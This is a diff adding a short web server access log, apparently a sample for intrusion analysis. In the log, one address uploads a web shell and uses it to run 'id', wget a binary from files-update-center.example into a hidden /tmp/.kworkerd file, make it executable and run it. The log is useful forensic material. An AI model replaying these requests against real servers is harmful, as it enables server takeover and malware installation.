@@ -1,0 +1,8 @@
+203.0.113.45 - - [21/Oct/2026:03:10:11 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+10.0.2.20 - - [21/Oct/2026:03:12:30 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+203.0.113.45 - - [21/Oct/2026:03:14:02 +0000] "POST /upload.php HTTP/1.1" 200 312 "-" "curl/7.81.0"
+203.0.113.45 - - [21/Oct/2026:03:14:20 +0000] "GET /uploads/cmd.php?c=id HTTP/1.1" 200 54 "-" "curl/7.81.0"
+203.0.113.45 - - [21/Oct/2026:03:14:41 +0000] "GET /uploads/cmd.php?c=wget%20http://files-update-center.example/kworkerd%20-O%20/tmp/.kworkerd HTTP/1.1" 200 210 "-" "curl/7.81.0"
+203.0.113.45 - - [21/Oct/2026:03:15:05 +0000] "GET /uploads/cmd.php?c=chmod%20%2Bx%20/tmp/.kworkerd HTTP/1.1" 200 12 "-" "curl/7.81.0"
+203.0.113.45 - - [21/Oct/2026:03:15:30 +0000] "GET /uploads/cmd.php?c=/tmp/.kworkerd HTTP/1.1" 200 20 "-" "curl/7.81.0"
+10.0.2.20 - - [21/Oct/2026:09:01:12 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
